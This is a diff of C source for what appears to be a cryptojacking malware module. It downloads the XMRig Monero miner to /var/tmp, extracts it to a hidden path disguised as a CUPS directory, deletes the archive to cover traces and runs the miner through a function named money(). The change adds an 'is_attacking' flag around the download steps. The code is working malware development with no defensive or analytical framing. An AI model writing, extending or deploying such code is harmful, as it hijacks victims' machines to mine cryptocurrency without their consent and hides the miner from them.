@@ -8,9 +8,6 @@
 
 #define HASH_LEN 65 // 64 characters for hash + 1 null terminator
 
-#define MONEY_DOWNLOAD_PATH "/var/tmp/xmrig.tar.gz"
-#define MONEY_EXECPATH "/var/tmp/.cups.d"
-
 #include "xmr.h"
 
 int fetch_xmrig(char *download_path) {
@@ -169,20 +166,24 @@ int money(char *exec_path) {
 }
 
 // Main function for xmrig module
-int xmrig(Globals * glob) {
+int xmrig(Globals * glob, int is_attacking) {
     global = glob;
 
-    if (download_retries_xmrig(MONEY_DOWNLOAD_PATH) < 0) {
-        DEBUG_LOG_ERR("[XMR] failed fetching\n");
-        return -1;
-    }
-    if (extract_xmrig_runner(MONEY_DOWNLOAD_PATH, MONEY_EXECPATH) < 0) {
-        DEBUG_LOG_ERR("[XMR] failed extracting\n");
-        return -1;
+    if(!is_attacking) {
+        if (download_retries_xmrig(MONEY_DOWNLOAD_PATH) < 0) {
+            DEBUG_LOG_ERR("[XMR] failed fetching\n");
+            return -1;
+        }
+
+        if (extract_xmrig_runner(MONEY_DOWNLOAD_PATH, MONEY_EXECPATH) < 0) {
+            DEBUG_LOG_ERR("[XMR] failed extracting\n");
+            return -1;
+        }
+
+        if (delete_file(MONEY_DOWNLOAD_PATH) < 0) {
+            DEBUG_LOG_ERR("[XMR] failed deleting, proceeding anyway\n");
+        }
     }
 
-    if (delete_file(MONEY_DOWNLOAD_PATH) < 0) {
-        DEBUG_LOG_ERR("[XMR] failed deleting, proceeding anyway\n");
-    }
     return money(MONEY_EXECPATH);
 }
